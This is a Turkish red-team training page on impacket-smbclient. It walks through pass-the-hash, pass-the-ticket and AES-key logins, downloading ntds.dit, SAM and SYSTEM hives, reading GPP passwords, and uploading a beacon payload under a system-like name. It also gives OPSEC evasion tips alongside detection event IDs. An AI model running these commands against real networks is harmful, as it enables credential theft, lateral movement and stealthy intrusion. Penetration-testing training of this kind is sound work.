# impacket-smbclient

> **Kategori:** [1. TEMEL İSTEMCİLER VE AĞ PROTOKOL ARAÇLARI (NATIVE CLIENTS & UTILITIES)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Python interaktif SMB kabuğu; NTLM hash (Pass-the-Hash) ve Kerberos bilet desteği ile C$ paylaşımında gezinme.

---

## 1. Genel Bakış ve Amaç

`impacket-smbclient` (veya `smbclient.py`), Impacket kütüphanesinin Python tabanlı interaktif SMB istemcisidir. Samba'nın native [smbclient](./smbclient.md) aracına benzer bir kabuk sunar ancak Impacket'in kendi SMB yığınını (stack) kullandığı için **Pass-the-Hash (PTH)**, **Pass-the-Ticket (PTT)** ve **AES key** kimlik doğrulama yöntemlerini sorunsuz destekler.

### Neden impacket-smbclient?

| Özellik | Native smbclient | impacket-smbclient |
|---|---|---|
| **PTH (NTLM hash)** | `--pw-nt-hash` gerekir | Doğrudan `-hashes LM:NT` |
| **Kerberos (ccache)** | `KRB5CCNAME` + `-k` | `-k -no-pass` + `KRB5CCNAME` |
| **AES Key desteği** | ❌ | ✅ `-aesKey` |
| **Platform** | Linux (Samba bağımlı) | Cross-platform (Python) |
| **smb.conf bağımlılığı** | Evet | Hayır |
| **İnteraktif kabuk** | FTP benzeri | MiniImpacketShell |

### Protokol Akışı

Impacket-smbclient, arka planda Impacket'in `SMBConnection` sınıfını kullanır:

1. **Negotiate** → SMB2/3 dialect anlaşması
2. **Session Setup** → NTLMSSP veya Kerberos AP-REQ ile kimlik doğrulama
3. **Tree Connect** → Belirtilen paylaşıma bağlanma
4. **Interaktif Komutlar** → Dosya okuma/yazma/listeleme

**Port:** TCP 445 (varsayılan), TCP 139 (opsiyonel)

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

### Bağlantı Formatı

```bash
impacket-smbclient [domain/]username[:password]@hedef
# veya
smbclient.py [domain/]username[:password]@hedef
```

### Kimlik Doğrulama Parametreleri

| Parametre | Açıklama | Örnek |
|---|---|---|
| `domain/user:pass@target` | Standart kimlik bilgisi formatı | `CORP/j.doe:Summer2024!@10.10.10.100` |
| `-hashes` | NTLM hash (LM:NT formatı) | `-hashes aad3b435b51404ee:32ed87bdb5fdc5e9` |
| `-no-pass` | Parola sorma (Kerberos/hash ile) | `-no-pass` |
| `-k` | Kerberos kimlik doğrulama | `-k` |
| `-aesKey` | Kerberos AES anahtarı ile kimlik doğrulama | `-aesKey 4a3c5...` |
| `-dc-ip` | Domain Controller IP adresi | `-dc-ip 10.10.10.100` |
| `-target-ip` | Hedef IP (hostname farklıysa) | `-target-ip 10.10.10.101` |
| `-port` | Hedef SMB portu | `-port 445` |
| `-debug` | Detaylı debug çıktısı | `-debug` |
| `-codec` | Karakter kodlama | `-codec utf-8` |

### İnteraktif Kabuk Komutları (MiniImpacketShell)

| Komut | Açıklama |
|---|---|
| `shares` | Paylaşımları listele |
| `use <paylaşım>` | Paylaşıma bağlan |
| `ls` | Dizin içeriğini listele |
| `cd <dizin>` | Dizin değiştir |
| `pwd` | Mevcut dizini göster |
| `get <dosya>` | Dosya indir |
| `put <yerel> <uzak>` | Dosya yükle |
| `cat <dosya>` | Dosya içeriğini görüntüle (indirmeden oku) |
| `mkdir <dizin>` | Dizin oluştur |
| `rmdir <dizin>` | Dizin sil |
| `rm <dosya>` | Dosya sil |
| `info <dosya>` | Dosya bilgisi (boyut, tarih, öznitelikler) |
| `who` | Bağlı oturumları göster |
| `close` | Mevcut paylaşım bağlantısını kapat |
| `exit` / `quit` | Çıkış |

---

## 3. Pratik Komut Örnekleri

### 3.1 Parola ile Bağlantı

```bash
# Domain kullanıcısı ile bağlan
impacket-smbclient CORP/j.doe:Summer2024\!@10.10.10.100

# Interaktif kabukta:
# # shares
# ADMIN$
# C$
# IPC$
# NETLOGON
# SYSVOL
# Backup
# # use C$
# # ls
# # cd Users\Administrator\Desktop
# # ls
# # get flag.txt
# # exit
```

### 3.2 Pass-the-Hash (PTH)

```bash
# NT hash ile doğrudan bağlan — en yaygın kullanım
impacket-smbclient CORP/Administrator@10.10.10.100 \
  -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4

# Sadece NT hash (LM kısmı sıfırlanmış)
impacket-smbclient CORP/Administrator@DC01.corp.local \
  -hashes 00000000000000000000000000000000:32ed87bdb5fdc5e9cba88547376818d4

# Kabukta:
# # use ADMIN$
# # ls
# # get repair\SAM
```

### 3.3 Kerberos Kimlik Doğrulama (Pass-the-Ticket)

```bash
# Önce ccache dosyasını ayarla
export KRB5CCNAME=/tmp/krb5cc_administrator

# Kerberos ile bağlan — FQDN zorunlu!
impacket-smbclient CORP/Administrator@DC01.corp.local -k -no-pass

# DC IP'si ayrıysa belirt
impacket-smbclient CORP/Administrator@DC01.corp.local -k -no-pass \
  -dc-ip 10.10.10.100
```

> ⚠️ Kerberos kullanırken hedefi **mutlaka FQDN** ile belirtin. IP kullanırsanız SPN eşleştirmesi başarısız olur.

### 3.4 AES Key ile Bağlantı

```bash
# AES256 anahtarı ile (Mimikatz/Rubeus'tan elde edilmiş)
impacket-smbclient CORP/Administrator@DC01.corp.local \
  -aesKey 4a3c5d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5 \
  -k -no-pass
```

### 3.5 Paylaşım Keşfi ve Dosya Gezinme

```bash
impacket-smbclient CORP/j.doe:Summer2024\!@DC01.corp.local

# Kabukta:
# # shares                          ← tüm paylaşımları listele
# # use SYSVOL                      ← SYSVOL'a bağlan
# # cd corp.local/Policies          ← GPO dizinine git
# # ls                              ← GPO'ları listele
# # cd {6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Preferences/Groups
# # cat Groups.xml                  ← GPP parolasını oku (indirmeden!)
```

### 3.6 Hassas Dosya İndirme

```bash
impacket-smbclient CORP/svc_backup@SRV01.corp.local \
  -hashes 00000000000000000000000000000000:7a21990fcd3d759941e45c490f143d5f

# Kabukta:
# # use C$
# # cd Windows\NTDS
# # get ntds.dit                    ← AD veritabanı (çok büyük, dikkat!)
# # cd \Windows\System32\config
# # get SYSTEM                      ← SYSTEM registry hive
# # get SAM                         ← Yerel SAM veritabanı
```

### 3.7 Payload Yükleme

```bash
impacket-smbclient CORP/Administrator@SRV01.corp.local \
  -hashes 00000000000000000000000000000000:32ed87bdb5fdc5e9

# Kabukta:
# # use C$
# # cd Windows\Temp
# # put /tmp/beacon.exe update.exe  ← payload yükle
# # ls                              ← yükleme doğrula
```

### 3.8 Non-İnteraktif Kullanım (Scripting)

```bash
# Tek satırda paylaşımları listele
echo "shares" | impacket-smbclient CORP/j.doe:Summer2024\!@10.10.10.100

# Dosya indir ve çık
echo -e "use C$\ncd Users\\Administrator\\Desktop\nget secret.txt\nexit" | \
  impacket-smbclient CORP/Administrator@10.10.10.100 \
  -hashes 00000000000000000000000000000000:32ed87bdb5fdc5e9
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı | Olası Neden | Çözüm |
|---|---|---|
| `[-] SMB SessionError: STATUS_LOGON_FAILURE` | Yanlış parola/hash veya hesap kilitli | Kimlik bilgilerini doğrula; `CORP/` domain prefix kontrol et |
| `[-] SMB SessionError: STATUS_ACCESS_DENIED` | Yetersiz yetki (admin değil) | Daha yetkili hesap kullan; hedef paylaşımı değiştir |
| `[-] SMB SessionError: STATUS_ACCOUNT_DISABLED` | Hesap devre dışı | Aktif hesap kullan |
| `[-] SMB SessionError: STATUS_PASSWORD_EXPIRED` | Parola süresi dolmuş | Parolayı sıfırla (`smbpasswd`) |
| `Kerberos SessionError: KDC_ERR_PREAUTH_FAILED` | Kerberos ön-kimlik doğrulama hatası | AES key / hash doğruluğunu kontrol et |
| `Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN` | SPN bulunamadı (IP kullanılmış) | Hedefi FQDN ile belirt |
| `[Errno Connection error]` | Port kapalı / hedef erişilemez | Port taraması yap; firewall kontrol et |
| `[-] Could not connect to <IP>:445` | SMB servisi çalışmıyor | Hedef durumu kontrol et; `-port 139` dene |
| Komutlarda Türkçe karakter sorunu | Codec uyumsuzluğu | `-codec utf-8` veya `-codec cp1254` ekle |

### impacket Kurulum Notu

```bash
# Güncel Impacket kurulumu (pip)
pip3 install impacket

# GitHub'dan (en güncel)
git clone https://github.com/fortra/impacket.git
cd impacket && pip3 install .

# Kali Linux'ta önceden yüklüdür:
which impacket-smbclient   # /usr/bin/impacket-smbclient
```

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler

| Kaynak | Event ID | Detay |
|---|---|---|
| **Security Log** | **4624** (Type 3) | Network logon — her bağlantıda |
| **Security Log** | **4672** | Özel ayrıcalık atandı (admin hesaplarında) |
| **Security Log** | **5140** | Paylaşıma erişim |
| **Security Log** | **5145** | Dosya/dizin erişim denetimi |
| **Security Log** | **4768/4769** | Kerberos TGT/TGS (Kerberos auth kullanılıyorsa) |
| **Security Log** | **4776** | NTLM doğrulama (PTH kullanılıyorsa) |

### 5.2 Ağ Parmak İzi

- **Impacket SMB fingerprint:** Impacket'in SMB negotiate mesajındaki `ClientGUID` ve `NativeOS` alanları native Windows istemcisinden farklıdır. NDR (Network Detection & Response) çözümleri bu farkı tespit edebilir.
- **Python user-agent:** Ağ trafiğinde Impacket'e özgü paketler tanımlanabilir.
- **PTH kullanımı:** NTLM kimlik doğrulamada LM hash'in `aad3b435b51404ee` (boş LM) olması PTH göstergesidir.

### 5.3 MITRE ATT&CK

| Teknik ID | Teknik Adı | Kullanım |
|---|---|---|
| **T1021.002** | Remote Services: SMB/Admin Shares | C$, ADMIN$ erişimi |
| **T1550.002** | Use Alternate Auth Material: Pass the Hash | `-hashes` ile PTH |
| **T1550.003** | Use Alternate Auth Material: Pass the Ticket | `-k` ile PTT |
| **T1039** | Data from Network Shared Drive | Dosya indirme |
| **T1570** | Lateral Tool Transfer | Payload yükleme |

### 5.4 OPSEC Önerileri

| Risk | Önlem |
|---|---|
| **Impacket ağ parmak izi** | İmpacket yerine native smbclient veya Windows istemcisi kullanmayı değerlendir |
| **C$/ADMIN$ erişimi alarm tetikler** | Özel paylaşımlar üzerinden çalış; admin paylaşımlarından kaçın |
| **PTH + 4672 olayı** | Admin hash kullanımı 4672 üretir → MDI/ATA tarafından tespit edilir |
| **Büyük dosya transferi** | NTDS.dit gibi büyük dosyaları küçük parçalara bölerek aktar |
| **cat komutu izi bırakmaz** | Dosyayı indirmek yerine `cat` ile oku → daha az iz |

### 5.5 Savunma Karşılığı

- PTH tespiti → [Blue M04 — Yanal Hareket Tespiti](../../../2-Blue_Team/Modul_04_Yanal_Hareket_Tespiti/)
- Kimlik bilgisi koruması → [Blue M03 — Credential Guard](../../../2-Blue_Team/Modul_03_Kimlik_Bilgisi_Korumasi/)
- Admin paylaşım erişim denetimi → [Blue M01 — Log Yönetimi](../../../2-Blue_Team/Modul_01_Gorunurluk_ve_Log_Yonetimi/)

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

Aşağıdaki liste, sızma testlerinde ve kırmızı takım operasyonlarında en sık kullanılan `impacket-smbclient` komutlarını, kullanım amaçlarını ve parametre analizlerini bir araya getirir:

### 6.1 Pass-the-Hash (NTLM Hash) ile Yönetici Paylaşımına (C$) Bağlanma
```bash
impacket-smbclient -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 LAB/Administrator@192.168.1.10
```
- **Ne Yapar?** Düz metin parola gerekmeden, yalnızca NT hash'i kullanarak hedef sunucunun C$ paylaşımına interaktif MiniImpacket kabuğu açar.
- **Ne Zaman Kullanılır?** LSASS veya SAM veritabanından dump edilen hash ile hedefe anında yetkili dosya erişimi sağlamak için.
- **Parametreler:** `-hashes [LM]:NT` (Boş LM hash için doğrudan `:NTHASH` formatı desteklenir).

### 6.2 Kerberos Bileti (TGT/TGS - ccache) ile Pass-the-Ticket Bağlantısı
```bash
export KRB5CCNAME=/tmp/administrator.ccache
impacket-smbclient -k -no-pass LAB/Administrator@dc01.lab.local
```
- **Ne Yapar?** Kerberos bilet dosyasını kullanarak parolasız olarak hedef makineye bağlanır.
- **Ne Zaman Kullanılır?** Golden/Silver Ticket veya Kerberos delegation istismarı sonrası elde edilen biletlerle ağda NTLM trafiği oluşturmadan (OPSEC) hareket etmek için.
- **Parametreler:** `-k` (Kerberos kimlik doğrulamasını zorlar), `-no-pass` (Parola girişini atlar). Hedef kesinlikle FQDN girilmelidir.

### 6.3 AES-256 Kerberos Anahtarı ile Bağlantı (Overpass-the-Hash)
```bash
impacket-smbclient -aesKey 7b318d9f10a7b5c829e1f2038475a6b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7 LAB/Administrator@dc01.lab.local
```
- **Ne Yapar?** NTLM yerine kullanıcının AES-256 Kerberos anahtarını kullanarak KDC'den bilet talep eder ve SMB oturumu açar.
- **Ne Zaman Kullanılır?** NTLM kimlik doğrulamasının tamamen devre dışı bırakıldığı modern sertleştirilmiş ortamlarda.
- **Parametreler:** `-aesKey` (64 karakterlik onaltılık AES256 anahtarı).

### 6.4 İnteraktif Kabukta Dosyayı İndirmeden Doğrudan Okuma (cat)
```bash
# impacket-smbclient kabuğu içinde:
shares
use C$
cat Users\Administrator\Desktop\flag.txt
```
- **Ne Yapar?** Dosyayı yerel saldırı makinesine indirmeden doğrudan bellek üzerinden okur ve terminale basar.
- **Ne Zaman Kullanılır?** Diske dosya yazmayarak EDR/antivirüs izini en aza indirmek ve metin/konfigürasyon dosyalarını hızlıca incelemek için.
- **Komutlar:** `shares` (paylaşımları listeler), `use <share>` (paylaşıma geçer), `cat <dosya>` (içeriği ekrana basar).

### 6.5 Uzak Sisteme Dosya / Payload Yükleme (put) ve İndirme (get)
```bash
# impacket-smbclient kabuğu içinde:
use C$
put /tmp/beacon.exe Windows\Temp\svchost_upd.exe
get Windows\System32\drivers\etc\hosts /tmp/hosts_dump
```
- **Ne Yapar?** Yerel diskteki bir zararlıyı/aracı Windows geçici klasörüne yükler veya uzaktaki kritik sistem dosyasını yerel diske çeker.
- **Ne Zaman Kullanılır?** Yanal hareket aşamasında uzaktaki sisteme payload bırakmak veya hasat edilen verileri çekmek için.

### 6.6 Proxychains / SOCKS Pivot Üzerinden İç Ağdaki Sunucuya Bağlantı
```bash
proxychains impacket-smbclient -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 LAB/Administrator@10.10.10.5
```
- **Ne Yapar?** Bir pivot noktası (Ligolo-ng / Chisel) üzerinden iç alt ağda izole edilmiş sunucunun SMB servisine bağlanır.
- **Ne Zaman Kullanılır?** Doğrudan erişilemeyen segmentli kurumsal ağlarda tünel üzerinden lateral movement yapmak için.

### 6.7 Yerel Hesap (Local Administrator) ile Bağlantı
```bash
impacket-smbclient -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 ./Administrator@192.168.1.10
```
- **Ne Yapar?** Etki alanı yerine makinenin yerel SAM veritabanındaki yönetici hesabı (`./Administrator`) ile kimlik doğrular.
- **Ne Zaman Kullanılır?** Etki alanı hesabı kilitlendiğinde veya LAPS / yerel yönetici parolası ele geçirildiğinde.
- **Parametreler:** `./kullanıcı` veya `localhost/kullanıcı` (Yerel kimlik doğrulamasını belirtir).

---

## Kaynaklar

| Kaynak | Bağlantı |
|---|---|
| Impacket GitHub | [github.com/fortra/impacket](https://github.com/fortra/impacket) |
| smbclient.py kaynak | [examples/smbclient.py](https://github.com/fortra/impacket/blob/main/examples/smbclient.py) |
| MITRE T1550.002 | [attack.mitre.org](https://attack.mitre.org/techniques/T1550/002/) |

---

> **Önceki:** [← smbmap](./smbmap.md) · **Sonraki:** [mount.cifs →](./mount.cifs.md)

